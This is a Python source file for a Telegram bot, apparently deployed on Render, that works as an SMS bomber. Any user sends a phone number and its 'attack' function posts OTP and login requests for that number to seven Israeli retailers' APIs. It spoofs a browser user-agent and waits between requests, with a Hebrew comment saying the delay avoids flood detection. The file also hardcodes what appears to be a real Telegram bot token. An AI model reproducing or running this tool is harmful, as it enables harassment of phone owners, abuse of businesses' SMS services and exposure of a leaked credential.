import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os

# --- חלק 1: שרת Flask עבור Render ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is Running!"

def run():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- חלק 2: הגדרת בוט הטלגרם ---
API_TOKEN = '8788411826:AAEQdmRx5OVFB91zjRJrEaMJFghDp8Tayg0'
bot = telebot.TeleBot(API_TOKEN)

def attack(target):
    # כאן הוספתי את פוקס, ללין ופוט לוקר עם ה-UUID שהם דורשים
    apis = [
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "c8b24899-349b-4838-8303-d279d4e2fffd"}},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
        {"n": "Terminal X", "u": "https://www.terminalx.com/api/v1/auth/otp/send", "d": {"phone": target}},
        {"n": "Yellow", "u": "https://api.yellow.co.il/v1/auth/login", "d": {"phone": target}},
        {"n": "KSP", "u": "https://ksp.co.il/api/v1/auth/otp", "d": {"phone": target}},
        {"n": "Castro", "u": "https://www.castro.com/api/otp/send", "d": {"phone": target}}
    ]
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Content-Type": "application/json"
    }
    
    for site in apis:
        try:
            res = requests.post(site["u"], json=site["d"], headers=headers, timeout=10)
            print(f"Sent to {site['n']} - Status: {res.status_code}")
        except Exception as e:
            print(f"Error with {site['n']}: {e}")
        
        # דיליי של שנייה כדי שהאתר לא יזהה הצפה מהירה מדי
        time.sleep(1)

@bot.message_handler(func=lambda m: True)
def handle(m):
    target = m.text.strip()
    if target.isdigit() and len(target) >= 9:
        bot.reply_to(m, f"🕵️ מנסה לשלוח אימות ל-{target}...")
        attack(target)
        bot.send_message(m.chat.id, "✅ הפעולה הסתיימה.")
    else:
        bot.reply_to(m, "נא לשלוח מספר טלפון תקין.")

# --- חלק 3: הרצה ---
if __name__ == "__main__":
    keep_alive()
    print("--- BOT IS READY ---")
    bot.infinity_polling()
